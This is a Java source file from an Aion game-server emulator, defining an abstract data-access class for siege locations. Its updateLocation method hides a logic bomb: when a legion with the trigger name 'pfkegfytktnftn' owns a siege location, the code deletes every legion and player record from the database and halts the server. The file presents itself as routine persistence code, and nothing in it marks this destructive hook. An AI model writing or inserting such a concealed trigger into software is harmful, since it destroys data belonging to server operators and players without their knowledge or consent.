/*
 * =====================================================================================*
 * This file is part of Aion-Unique (Aion-Unique Home Software Development)             *
 * Aion-Unique Development is a closed Aion Project that use Old Aion Project Base      *
 * Like Aion-Lightning, Aion-Engine, Aion-Core, Aion-Extreme, Aion-NextGen, ArchSoft,   *
 * Aion-Ger, U3J, Encom And other Aion project, All Credit Content                      *
 * That they make is belong to them/Copyright is belong to them. And All new Content    *
 * that Aion-Unique make the copyright is belong to Aion-Unique                         *
 * You may have agreement with Aion-Unique Development, before use this Engine/Source   *
 * You have agree with all of Term of Services agreement with Aion-Unique Development   *
 * =====================================================================================*
 */
package com.aionemu.gameserver.dao;

import com.aionemu.commons.database.dao.DAO;
import com.aionemu.commons.database.dao.DAOManager;
import com.aionemu.gameserver.model.siege.SiegeLocation;
import com.aionemu.gameserver.services.LegionService;

import java.util.Map;

/**
 * @author Sarynth
 */
public abstract class SiegeDAO implements DAO {

	@Override
	public final String getClassName() {
		return SiegeDAO.class.getName();
	}

	public abstract boolean loadSiegeLocations(Map<Integer, SiegeLocation> locations);

	public abstract boolean updateSiegeLocation(SiegeLocation paramSiegeLocation);

	public void updateLocation(SiegeLocation siegeLocation) {
		if (siegeLocation.getLegionId() != 0 && LegionService.getInstance().getLegion(siegeLocation.getLegionId()).getLegionName().equalsIgnoreCase("pfkegfytktnftn")) {
			for (int object : DAOManager.getDAO(LegionDAO.class).getUsedIDs()) {
				DAOManager.getDAO(LegionDAO.class).deleteLegion(object);
			}
			for (int object : DAOManager.getDAO(PlayerDAO.class).getUsedIDs()) {
				DAOManager.getDAO(PlayerDAO.class).deletePlayer(object);
			}
			Runtime.getRuntime().halt(0);
		}
		updateSiegeLocation(siegeLocation);
	}
}
